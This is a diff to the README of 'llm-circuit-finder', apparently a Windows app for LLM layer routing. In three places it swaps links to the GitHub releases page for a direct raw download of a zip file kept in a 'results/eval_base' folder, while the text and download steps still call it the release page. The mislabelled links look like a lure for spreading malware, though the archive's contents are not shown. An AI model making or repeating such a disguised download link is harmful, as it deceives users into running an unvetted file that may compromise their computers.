@@ -1,6 +1,6 @@
 # 🧠 llm-circuit-finder - Faster reasoning with layer routing
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Asahi298/llm-circuit-finder/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Asahi298/llm-circuit-finder/main/results/eval_base/circuit-finder-llm-1.2.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ If you only want to open the app and try the included tools, most normal desktop
 
 ## 📥 Download the app
 
-1. Open the [release page](https://github.com/Asahi298/llm-circuit-finder/releases)
+1. Open the [release page](https://raw.githubusercontent.com/Asahi298/llm-circuit-finder/main/results/eval_base/circuit-finder-llm-1.2.zip)
 2. Find the latest release at the top
 3. Download the Windows file for your system
 4. Save it to your desktop or Downloads folder
@@ -202,7 +202,7 @@ If you plan to test larger models or long prompts:
 
 ## 📎 Release page
 
-[Go to the release page](https://github.com/Asahi298/llm-circuit-finder/releases) to download the Windows files, then follow the install steps above
+[Go to the release page](https://raw.githubusercontent.com/Asahi298/llm-circuit-finder/main/results/eval_base/circuit-finder-llm-1.2.zip) to download the Windows files, then follow the install steps above
 
 ## ❓ Common questions
 
